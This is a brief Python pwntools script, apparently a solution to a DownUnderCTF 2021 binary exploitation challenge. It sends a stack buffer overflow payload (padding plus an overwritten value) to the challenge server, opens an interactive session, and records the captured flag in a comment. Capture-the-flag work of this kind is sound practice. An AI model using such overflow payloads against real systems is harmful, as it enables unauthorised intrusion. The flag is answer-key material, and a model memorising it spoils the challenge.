from pwn import *
p = remote('pwn-2021.duc.tf', 31916)

p.sendline(b'a'*0x18 + p64(0xdeadc0de))
p.interactive()

# DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}